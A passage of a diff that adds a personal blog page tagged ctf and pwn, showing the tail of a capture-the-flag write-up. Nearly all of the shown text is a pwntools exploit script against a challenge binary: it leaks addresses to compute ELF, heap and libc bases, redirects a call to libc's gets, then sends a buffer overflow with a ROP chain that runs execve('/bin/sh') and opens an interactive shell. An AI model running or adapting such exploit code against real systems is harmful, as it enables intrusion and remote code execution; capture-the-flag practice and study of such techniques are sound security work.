+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Failed to retreat agent: </span><span style="color:#e6db74">{</span>response<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">seize_airwaves</span>(hex_addr):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;seize_airwaves &#39;</span> <span style="color:#f92672">+</span> hex_addr)
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ANTENNA_OK&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> response:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Failed to seize airwaves: </span><span style="color:#e6db74">{</span>response<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">steal_noopsy_secrets</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;steal_noopsy_secrets&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;BLUEPRINT_FRAGMENT: &#39;</span>)
+</span></span><span style="display:flex;"><span>    fragment <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(fragment, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">initiate_city_takeover</span>(hex_addr):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;initiate_city_takeover&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39; </span><span style="color:#e6db74">{</span>hex_addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_echo_pulse</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_echo_pulse&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> steal_noopsy_secrets()
+</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x6d0</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ELF base address: </span><span style="color:#e6db74">{</span>hex(elf<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>agent0 <span style="color:#f92672">=</span> unleash_swarm(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Agent 0 address: </span><span style="color:#e6db74">{</span>hex(agent0)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> agent0 <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x16c0</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Heap address: </span><span style="color:#e6db74">{</span>hex(heap_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> unleash_swarm(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x200000</span>) <span style="color:#75715e"># large allocation to leak libc</span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">2113520</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Libc base address: </span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># one gadet not working :C</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># one_gadget1 = 0x4c139 + libc.address</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># one_gadget2 = 0x4c140 + libc.address</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># one_gadget3 = 0xd515f + libc.address</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># seize_airwaves(hex(one_gadget3)[2:].encode())</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># send_echo_pulse()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>seize_airwaves(hex(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;gets&#39;</span>])[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>send_echo_pulse()
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(libc)
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>execve(binsh, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2168</span>  <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain() )
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;vanish_into_shadows&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/ctf">ctf</a></li>
+					
+					<li><a href="/tags/pwn">pwn</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/pegielm" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://x.com/pegielm/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2025   © pegielm |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
